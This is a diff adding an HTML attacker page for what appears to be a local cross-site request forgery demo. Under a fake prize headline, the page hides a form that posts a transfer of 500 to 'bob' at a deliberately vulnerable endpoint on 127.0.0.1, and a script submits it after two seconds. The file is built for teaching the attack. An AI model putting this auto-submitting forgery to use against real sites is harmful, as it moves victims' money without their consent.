@@ -1,0 +1,32 @@
+<!DOCTYPE html>
+<html lang="en">
+	<head>
+		<meta charset="UTF-8" />
+			<title>Totally Harmless Page</title>
+		</head>
+	<body>
+		<h1>You won a free prize! Click nothing, just wait...</h1>
+
+		<!--
+    This form auto-submits to the vulnerable CSRF demo endpoint.
+    If the victim is logged in (http://127.0.0.1:5000) their browser
+    will attach the session cookie automatically, and the transfer
+    will go through without their knowledge or consent.
+
+    Open this file directly in the browser, or serve it separately
+    from the demo app at http://127.0.0.1:8000/attacker.html
+  -->
+
+		<form id="csrf-form" action="http://127.0.0.1:5000/transfer/vulnerable" method="POST">
+			<input type="hidden" name="to" value="bob"/>
+				<input type="hidden" name="amount" value="500" />
+  </form>
+
+		<script>
+			// Auto-submits after 2 seconds
+			setTimeout(function () {
+			document.getElementById('csrf-form').submit();
+			}, 2000);
+		</script>
+	</body>
+</html>
